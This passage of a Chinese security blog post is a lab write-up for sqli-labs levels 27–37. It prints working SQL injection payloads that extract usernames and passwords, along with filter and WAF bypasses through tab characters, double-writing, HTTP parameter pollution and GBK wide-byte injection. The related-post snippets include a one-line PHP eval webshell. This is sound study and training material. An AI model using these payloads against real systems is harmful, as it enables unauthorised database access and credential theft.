+<p>爆字段：<br><code>&#39;%09or%09updatexml(1,%09(concat(0x7e,%09(SeLeCt%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_schema=database()%09and%09table_name=&#39;users&#39;),%090x7e)),%091)%09or%09&#39;1&#39;=&#39;2</code></p>
+<p>爆数据（<code>limit</code>偏移）：<br><code>&#39;%09or%09updatexml(1,%09(concat(0x7e,%09(SeLeCt%09group_concat(username)%09from%09users%09limit%090,1),%090x7e)),%091)%09or%09&#39;1&#39;=&#39;2</code><br>然后发现<code>limit 1,1</code>就没有任何显示了？？？？</p>
+<p>实际上可以用制表符代替分隔符的话，可以直接<code>union select</code>：<br><code>&#39;%09UnIoN%09SeLeCt%091,group_concat(username),group_concat(password)%09from%09users%09where%09&#39;1&#39;=&#39;1</code></p>
+<p><code>union</code>和<code>select</code>的限制也可以直接双写绕过</p>
+<h2 id="Less-27a-GET-Blind-Based-All-your-UNION-SELECT-Belong-to-us-–-Double-Quotes"><a href="#Less-27a-GET-Blind-Based-All-your-UNION-SELECT-Belong-to-us-–-Double-Quotes" class="headerlink" title="Less-27a: GET - Blind Based - All your UNION &amp; SELECT Belong to us – Double Quotes"></a>Less-27a: GET - Blind Based - All your UNION &amp; SELECT Belong to us – Double Quotes</h2><p>和上题差不多，换成双引号，关闭错误回显</p>
+<p>爆数据：<br><code>&quot;%09UnIoN%09SeLeCt%091,group_concat(username),group_concat(password)%09from%09users%09where%09&quot;1&quot;=&quot;1</code></p>
+<h2 id="Less-28-GET-Error-Based-All-your-UNION-SELECT-Belong-to-us-–-String-–-Single-quote-with-parenthesis"><a href="#Less-28-GET-Error-Based-All-your-UNION-SELECT-Belong-to-us-–-String-–-Single-quote-with-parenthesis" class="headerlink" title="Less-28: GET - Error Based - All your UNION &amp; SELECT Belong to us – String – Single quote with parenthesis"></a>Less-28: GET - Error Based - All your UNION &amp; SELECT Belong to us – String – Single quote with parenthesis</h2><p>首先还是先试试</p>
+<p><code>&#39; or &#39;1&#39;=&#39;1</code>这个可以正常回显<br>返回提示：<code>Your Input is Filtered with following result: &#39;or&#39;1&#39;=&#39;1</code><br>空格被过滤了<br>然后试了试制表符<code>%09</code>，返回提示：<code>result: &#39; or &#39;1&#39;=&#39;1</code><br>说明制表符可用，过滤不完全</p>
+<p><code>union</code>和<code>select</code>又被过滤，但试了试大小写混拼不行<br>双写，发现返回提示：<code>result: &#39; ununionion seselectlect 1,2,&#39;3</code><br>说明双写的内容没有被过滤，怎么回事？？</p>
+<p>看眼源码，发现针对这俩的过滤正则是这样的：<code>/union\s+select/i</code><br>即过滤的是这俩的组合</p>
+<p>想到除去<code>union select</code>之外还有一个<code>union all select</code><br>可以用这个绕过上面的过滤</p>
+<p>另外还发现不仅有单引号，还有一个圆括号也要闭合<br>于是有如下payload：<code>&#39;)%09union%09all%09select%09&#39;1&#39;,&#39;2&#39;,(&#39;3</code></p>
+<p>爆库：<code>&#39;)%09union%09all%09select%09&#39;1&#39;,&#39;2&#39;,(&#39;3</code></p>
+<p>爆表：<br><code>&#39;)%09union%09all%09select%09&#39;1&#39;,group_concat(table_name),3%09from%09information_schema.tables%09where%09table_schema=database%09and%09&#39;1&#39;=(&#39;1</code></p>
+<p>爆字段：<br><code>&#39;)%09union%09all%09select%09&#39;1&#39;,group_concat(column_name),3%09from%09information_schema.columns%09where%09table_schema=database()%09and%09table_name=&#39;users&#39;%09and%09&#39;1&#39;=(&#39;1</code></p>
+<p>爆数据：<br><code>&#39;)%09union%09all%09select%09&#39;1&#39;,group_concat(username),group_concat(password)%09from%09users%09where%09&#39;1&#39;=(&#39;1</code></p>
+<h2 id="Less-28a-GET-Blind-Based-All-your-UNION-SELECT-Belong-to-us-–-single-quote-parenthesis"><a href="#Less-28a-GET-Blind-Based-All-your-UNION-SELECT-Belong-to-us-–-single-quote-parenthesis" class="headerlink" title="Less-28a: GET - Blind Based - All your UNION &amp; SELECT Belong to us – single quote-parenthesis"></a>Less-28a: GET - Blind Based - All your UNION &amp; SELECT Belong to us – single quote-parenthesis</h2><p>很卵奇怪，和上一题没啥区别<br>看一眼源码，发现除了对<code>union select</code>的组合过滤之外没有别的过滤了</p>
+<h2 id="Less-29-GET-Error-based-IMPIDENCE-MISMATCH-–-Having-a-WAF-in-front-of-web-application"><a href="#Less-29-GET-Error-based-IMPIDENCE-MISMATCH-–-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-29: GET - Error based - IMPIDENCE MISMATCH – Having a WAF in front of web application"></a>Less-29: GET - Error based - IMPIDENCE MISMATCH – Having a WAF in front of web application</h2><p>“IMPIDENCE MISMATCH”——预防不匹配？<br>另外题目说有WAF<br>（<code>This Site Protected by World&#39;s Best Firewall</code>，嗯哼？）</p>
+<p>随便试试，发现乱注？<code>&#39; or 1=1 %23</code>有回显<br>真就乱注，爆数据：<code>&#39; union select 1,group_concat(username),group_concat(password) from users %23</code></p>
+<p>怎么回事，看看源码<br>源码里面也没有任何关于WAF的内容啊？</p>
+<hr>
+<p>破案了，原来用户界面是<code>login.php</code>，不是默认的<code>index.php</code><br>那就重新来过</p>
+<p>发现不管给<code>id</code>传入什么参数都会报错，然后302跳到一个<code>hacked.php</code><br>显示说被WAF挡住了</p>
+<p>看源码，发现有很奇怪的地方，既有<code>id1</code>又有<code>id</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=<span class="title function_ invoke__">java_implimentation</span>(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="title function_ invoke__">whitelist</span>(<span class="variable">$id1</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>whitelist</code>函数用白名单限制了参数只能为整数</p>
+<p><code>java_implimentation</code>函数如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="variable">$val</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>) &#123;</span><br><span class="line">			<span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>explode</code>函数用于将字符串打散成数组<br><code>java_implimentation</code>函数的目的大概在于，捕获第一个<code>id</code>参数并返回<br>问题就在于只捕获<strong>第一个</strong><code>id</code>参数，就把它返回给<code>id1</code><br>并且后面的白名单检测，只检测<code>id1</code><br>而拼接在SQL语句里的是从<code>$_GET[&#39;id&#39;]</code>获得的<code>id</code></p>
+<p>再结合一波<strong>HPP（HTTP Parameter Pollution，HTTP参数污染）</strong>的知识<br>大概是请求参数中有两个参数同名的话<br>不同Web服务器对其的处理规则不同<br>从而导致利用点出现</p>
+<p>例如PHP&#x2F;Apache里边，会把最后一个同名参数作为传参<br><code>http://www.xx.com/?id=1&amp;id=&#39; or &#39;1&#39;=&#39;1</code><br>有可能检测到第一个<code>id</code>正常就通过，而传入服务器的是后面的恶意参数</p>
+<p>下面是具体不同Web服务器的处理方式：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Web服务器</th>
+<th align="left">参数获取函数</th>
+<th>获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">PHP&#x2F;Apache</td>
+<td align="left">$_GET(“par”)</td>
+<td>Last</td>
+</tr>
+<tr>
+<td align="left">JSP&#x2F;Tomcat</td>
+<td align="left">Request.getParameter(“par”)</td>
+<td>First</td>
+</tr>
+<tr>
+<td align="left">Perl(CGI)&#x2F;Apache</td>
+<td align="left">Param(“par”)</td>
+<td>First</td>
+</tr>
+<tr>
+<td align="left">Python&#x2F;Apache</td>
+<td align="left">Getvalue(“par”)</td>
+<td>All(List)</td>
+</tr>
+<tr>
+<td align="left">ASP&#x2F;IIS</td>
+<td align="left">Request.QueryString(“par”)</td>
+<td>All(comma-delimited string)</td>
+</tr>
+</tbody></table>
+<hr>
+<p>所以根据上述知识，只需要传入两个<code>id</code>参数，就可以WAF Bypass了，payload：<br><code>?id=1&amp;id=&#39; union select 1,group_concat(username),group_concat(password) from users %23</code><br>（前面的过程略）</p>
+<hr>
+<p>另外关于这个WAF的体现，整（fu）理（zhi）了一波<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105850027">网上的资料</a></p>
+<p>大概是这么一个双层服务器架构</p>
+<p><img src="/2021/12/18/sqli-labs-Adv-Injections/format,png.png" alt="img"></p>
+<blockquote>
+<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
+<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
+<p>接下来是参数解析的问题。<br>问：index.php?id&#x3D;1&amp;id&#x3D;2，这时回显是id&#x3D;1还是id&#x3D;2呢？<br>答：apache (php) 解析最后一个参数，即回显id&#x3D;2；tomcat (jsp) 解析第<br>一个参数，即回显id&#x3D;1。</p>
+<p>问：index.jsp?id&#x3D;1&amp;id&#x3D;2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？<br>答：此处应该还是id&#x3D;2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。</p>
+<p>而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。</p>
+<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id&#x3D;1&amp;id&#x3D;0 or 1&#x3D;1–+，tomcat 只检查第一个参数id&#x3D;1，而对第二个参数id&#x3D;0 or 1&#x3D;1–+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</p>
+</blockquote>
+<p>所以这题模拟的就是上面的Tomcat WAF&amp;Apache Server架构 </p>
+<h2 id="Less-30-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><a href="#Less-30-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-30: GET - BLIND - IMPIDENCE MISMATCH - Having a WAF in front of web application"></a>Less-30: GET - BLIND - IMPIDENCE MISMATCH - Having a WAF in front of web application</h2><p>承接上题经验<br>单<code>id</code>参数会报错<br>双重<code>id</code>前正确后恶意能行：<code>?id=1&amp;id=&quot; or 1=1 %23</code><br>测出来是双引号字符型</p>
+<p>直接上最后爆数据的payload：<br><code>?id=1&amp;id=&quot; union select 1,group_concat(username),group_concat(password) from users %23</code></p>
+<p>看源码：</p>
+<p>和上题没啥区别</p>
+<h2 id="Less-31-GET-BLIND-IMPIDENCE-MISMATCH-–-Having-a-WAF-in-front-of-web-application"><a href="#Less-31-GET-BLIND-IMPIDENCE-MISMATCH-–-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-31: GET - BLIND - IMPIDENCE MISMATCH – Having a WAF in front of web application"></a>Less-31: GET - BLIND - IMPIDENCE MISMATCH – Having a WAF in front of web application</h2><p>承接Less-29题经验</p>
+<p>只是变成了双引号+圆括号闭合：<code>?id=1&amp;id=&quot;) or 1=1 %23</code></p>
+<p>最后爆数据的payload：<br><code>?id=1&amp;id=&quot;) union select 1,group_concat(username),group_concat(password) from users %23</code></p>
+<p>源码其余地方和之前一样</p>
+<h2 id="Less-32-GET-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><a href="#Less-32-GET-Bypass-custom-filter-adding-slashes-to-dangerous-chars" class="headerlink" title="Less-32: GET - Bypass custom filter adding slashes to dangerous chars"></a>Less-32: GET - Bypass custom filter adding slashes to dangerous chars</h2><p>打入单引号的时候，发现提示回显：<br><em>Hint: The Query String you input is escaped as : \‘</em><br><em>The Query String you input in Hex becomes : 5c27</em></p>
+<p>看上去是被加了反斜杠进行转义<br>简单测试，发现<code>&#39;</code>、<code>&quot;</code>以及<code>\</code>都会被加上反斜杠进行转义</p>
+<p>结合提示会回显16进制的查询结果，考虑宽字符注入</p>
+<hr>
+<p>下面的内容来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43266093/article/details/121592299">Pikachu靶场练习笔记</a>的宽字节注入内容</p>
+<p>主要是利用了GBK系列编码，<strong>将两个字节当成是一个中文字符</strong>的原理</p>
+<p>相关配置为：<code>set character_set_client = gbk</code></p>
+<p>一般为引号被加上反斜杠转义的情况<br><code>1&#39; and 1=1 #</code>-&gt;<code>1\&#39; and 1=1 #</code><br>相当于查询id为‘1’ and 1&#x3D;1 #’的信息</p>
+<p>但是可以主动加上一个‘%df’<br><code>1%df&#39; and 1=1 #</code>-&gt;<code>1%df\&#39; and 1=1 #</code>-&gt;<code>1%df%5c&#39; and 1=1 #</code>-&gt;<code>1輼&#39; and 1=1 #</code><br>相当于查询id为‘1輼’的信息，然后执行and后面的判断</p>
+<hr>
+<p>于是验证注入的payload：<code>%df&#39; or 1=1 %23</code></p>
+<p>后续略</p>
+<p>其中需要用到字符串判断的地方，比如要<code>table_name=&#39;users&#39;</code><br>可以使用**<code>concat</code>函数<strong>和</strong><code>char</code>函数**来进行结合变式<br><code>?id=%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=concat(char(117),char(115),char(101),char(114),char(115)) %23</code></p>
+<h2 id="Less-33-GET-Bypass-AddSlashes"><a href="#Less-33-GET-Bypass-AddSlashes" class="headerlink" title="Less-33: GET - Bypass AddSlashes()"></a>Less-33: GET - Bypass AddSlashes()</h2><p>AddSlashes，添加斜杠<br>后面跟个圆括号，看起来像个给特殊字符添加斜杆来转义的函数</p>
+<p>果不其然，参数<code>id</code>打入单引号，提示回显给加上了反斜杠</p>
+<p>可以考虑<strong>宽字节注入</strong></p>
+<p><code>?id=%df&#39; or 1=1 %23</code>就可以正确回显了，说明宽字节注入有效<br>那基本上就和上一题一样了</p>
+<p>看看源码，主要是使用<code>addslashes</code>函数对传参进行过滤<br>这个函数主要是对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>以及<code>NULL</code>字符前边加上反斜杠</p>
+<p>此外源码里面有一行比较有意思：<br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br>看来宽字节注入真的与GBK编码有很大干系</p>
+<h2 id="Less-34-POST-Bypass-AddSlashes"><a href="#Less-34-POST-Bypass-AddSlashes" class="headerlink" title="Less-34: POST - Bypass AddSlashes()"></a>Less-34: POST - Bypass AddSlashes()</h2><p>变成登录框，两个框都会添加反斜杠</p>
+<p>遇到问题了，POST怎么做到宽字节注入？</p>
+<hr>
+<p>哦，原来原理上是一样的<br>验证payload：username:<code>%df&#39; or 1=1 #</code>&#x2F;password:<code>1</code></p>
+<p>这里需要了解一下<code>Content-Type: application/x-www-form-urlencoded</code><br>这种MIME是<code>form</code>标签不设置别的<code>encrypt</code>属性时所默认采用的<br>它会把表单提交的键和值进行url编码</p>
+<p>所以从网页上提交的payload，再经过url编码后，会变成这样：<br><code>%25df%27+or+1%3D1+%23</code><br>即<code>%</code>被转码了，所以提示回显里面的百分号出现了</p>
+<p>所以需要使用bp等代理工具进行抓包改包：</p>
+<p><img src="/2021/12/18/sqli-labs-Adv-Injections/image-20211218201203305.png" alt="image-20211218201203305"></p>
+<p>这样的所发出的payload才有效，才能注入成功</p>
+<hr>
+<p>剩下的payload如无说明默认是<code>uname</code>的参数</p>
+<p>判断回显字段数为2：<br><code>%df&#39; or 1=1 order by 2#</code></p>
+<p>查看回显的字段：<br><code>%df&#39; union select 1,2#</code></p>
+<p>下略</p>
+<p>其中需要用到字符串判断的地方，比如要<code>table_name=&#39;users&#39;</code><br>可以使用**<code>concat</code>函数<strong>和</strong><code>char</code>函数**来进行结合变式</p>
+<h2 id="Less-35-GET-Bypass-Add-Slashes-we-dont-need-them-Interger-based"><a href="#Less-35-GET-Bypass-Add-Slashes-we-dont-need-them-Interger-based" class="headerlink" title="Less-35: GET - Bypass Add Slashes (we dont need them) Interger based"></a>Less-35: GET - Bypass Add Slashes (we dont need them) Interger based</h2><p>数字型还要什么双引号，直接验证注入：<code>?id=999 or 1=1 %23</code></p>
+<p>爆列：<br><code>?id=999 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=concat(char(117),char(115),char(101),char(114),char(115)) %23</code></p>
+<p>下略</p>
+<h2 id="Less-36-GET-–-Bypass-MySQL-real-escape-string"><a href="#Less-36-GET-–-Bypass-MySQL-real-escape-string" class="headerlink" title="Less-36: GET – Bypass MySQL_real_escape_string"></a>Less-36: GET – Bypass MySQL_real_escape_string</h2><p>怕是要绕过<code>mysql_real_escape_string</code>这个函数</p>
+<p>结果可以宽字节绕过</p>
+<hr>
+<p>记一下GBK编码如何防止宽字符注入</p>
+<p><strong>先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string函数来过滤用户输入</strong><br>（<code>mysql_set_charset(&#39;gbk&#39;,&#39;$conn&#39;)</code>）</p>
+<blockquote>
+<p>也就是说，先不进行转义，首先以GBK编码的形式对提交上来的参数进行编码，然后再进行转义，（先编码也意味着反斜杠即5c不会出现，到下一步的转义引号才出现）</p>
+</blockquote>
+<p>源码的失误就在于先转义再编码</p>
+<h2 id="Less-37-POST-–-Bypass-MySQL-real-escape-string"><a href="#Less-37-POST-–-Bypass-MySQL-real-escape-string" class="headerlink" title="Less-37: POST – Bypass MySQL_real_escape_string"></a>Less-37: POST – Bypass MySQL_real_escape_string</h2><p>虽然使用<code>mysql_real_escape_string</code>函数，但是和GBK字符集设置顺序有误</p>
+<p>所以可以宽字符绕过</p>
+<p>详见Less-34、Less-36</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/rickroll.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
+								sqli-labs Stacked Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 30日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
+								Web靶场-Pikachu			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
+环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
+								一些BurpSuite进阶使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 10日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
+后续再考虑找些专门的教程学学
+使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
+来自于g0tmi1k的文章
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">
+								SQL与sqlmap			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 13日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQL与sqlmapSQL语法order by
+
+对查询结果排序
+ASC：升序（默认）、DESC：降序
+SQL注入中多在成功查询之后添加order by i来猜解回显的字段数
+如XXX/?id=1&#39; order ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="SQL与sqlmap"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">
+								Web靶场-Web For Pentester			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 17日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Web For Pentester靶场练习笔记前言搞完XVWA之后
+环境hacker: Kali Linux | 192.168.10.1&#x2F;10.10.10.1server: Debian 6 | 192.16...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Web For Pentester"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/15/sqli-labs-Basic-Challenges/" title="sqli-labs Basic Challenges">
+								sqli-labs Basic Challenges			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 15日, 2021				
+							</p>
+							<p class="relate-post-content">
